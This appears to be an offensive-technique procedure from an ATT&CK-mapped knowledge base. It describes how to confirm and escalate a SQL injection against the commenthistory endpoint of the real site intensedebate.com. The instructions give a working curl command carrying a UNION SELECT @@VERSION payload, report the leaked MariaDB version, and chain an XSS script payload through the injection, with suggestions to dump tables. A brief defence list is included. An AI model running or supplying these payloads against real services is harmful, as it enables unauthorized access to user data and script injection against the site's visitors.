---
tags:
  - analysis
  - exfil
  - web
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-intensedebate-sqli]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T03:15:05.461Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: af560e1e-1dce-4314-9c09-2813d3b7d18c
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Observe-SQL-Injection-Results

## Summary

This procedure inspects the response from the SQL injection to confirm exploitation, extract leaked data like the database version, and identify opportunities for further attacks such as reflected XSS.

## Description

After injection, the union query results blend with legitimate output, displaying the database version (10.1.32-MariaDB) in the page. Inspecting the HTML reveals this; additional payloads can dump tables or inject <script> for XSS. The impact includes full DB access to user data and client-side script execution.

## Requirements

1. Successful injection response
2. Ability to view page source or HTTP body
3. Follow-up payload ideas for escalation

## Defense

Defensive measures and detection strategies:

- Encode all outputs to prevent XSS reflection
- Use database activity monitoring to detect unusual queries
- Implement content security policy (CSP) to block injected scripts

## Objectives

1. Verify SQLi success via leaked info
2. Assess data access potential
3. Test for chained XSS vulnerabilities

## Instructions

### Step 1: Fetch and Inspect Response

**Context**: Retrieve the injected page to view results.

Use [[commands/curl-intensedebate-sqli]] and pipe to grep for version:

```bash
curl "https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23" | grep -i version
```

> Output shows '10.1.32-MariaDB' in the content.

### Step 2: Analyze for Further Exploitation

**Context**: Check for XSS or data patterns.

View page source in browser; test XSS payload like union select 1,2,'<script>alert(1)</script>'#.

> Script executes if reflected without encoding, confirming chain.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System (adapted for DB)

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-intensedebate-sqli]]

## Tools Used

- None

## Tags

- [[result-analysis]]
- [[data-leak]]
